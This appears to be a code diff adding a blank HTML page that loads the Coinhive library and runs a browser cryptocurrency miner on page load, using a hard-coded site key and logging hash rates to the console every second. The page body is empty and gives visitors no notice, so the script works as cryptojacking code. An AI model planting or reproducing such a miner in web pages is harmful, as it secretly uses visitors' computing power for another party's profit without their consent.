@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('dHy922Sbzsmaexu4zHFhcGySfXqpQdwT', {throttle: 0.3});
+	miner.setThrottle(0.1);
+	miner.start();
+
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+        console.log(JSON.stringify({"hashesPerSecond": hashesPerSecond}))
+        console.log(JSON.stringify({"totalHashes": totalHashes}))
+        console.log(JSON.stringify({"acceptedHashes": acceptedHashes}))
+	}, 1000);
+
+</script>
+<body>
+</body>
+</html>
